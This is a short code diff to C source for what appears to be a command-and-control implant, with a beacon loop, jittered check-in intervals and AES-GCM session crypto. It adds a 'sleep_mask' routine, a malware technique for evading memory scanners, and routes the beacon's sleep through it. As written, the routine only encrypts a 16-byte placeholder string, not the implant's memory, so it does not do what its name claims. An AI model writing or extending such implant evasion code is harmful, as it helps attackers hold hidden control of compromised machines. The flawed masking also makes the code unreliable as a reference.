@@ -202,6 +202,25 @@ static char *aes_gcm_open_raw(const unsigned char key[32], const unsigned char *
     return pt;
 }
 
+static void sleep_mask(int ms) {
+    unsigned char buf[16];
+    unsigned char key[32];
+    memcpy(buf, "sleep-mask-v1!!", 16);
+    if (!BCRYPT_SUCCESS(BCryptGenRandom(NULL, key, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG))) {
+        Sleep(ms > 0 ? ms : 1);
+        return;
+    }
+    size_t slen = 0;
+    unsigned char *sealed = aes_gcm_raw(key, buf, 16, &slen);
+    memset(buf, 0, sizeof(buf));
+    Sleep(ms > 0 ? ms : 1);
+    if (sealed) {
+        char *pt = aes_gcm_open_raw(key, sealed, slen);
+        if (pt) free(pt);
+        free(sealed);
+    }
+}
+
 static unsigned char g_session[32], g_hs[32], g_eph[32];
 static int g_have_session = 0, g_have_eph = 0;
 
@@ -643,7 +662,7 @@ static void beacon_loop(void) {
             sleep_ms = sleep_ms - jitter + (rand() % (jitter * 2 + 1));
         }
         if (sleep_ms < 1000) sleep_ms = 1000;
-        Sleep(sleep_ms);
+        sleep_mask(sleep_ms);
     }
 }
 
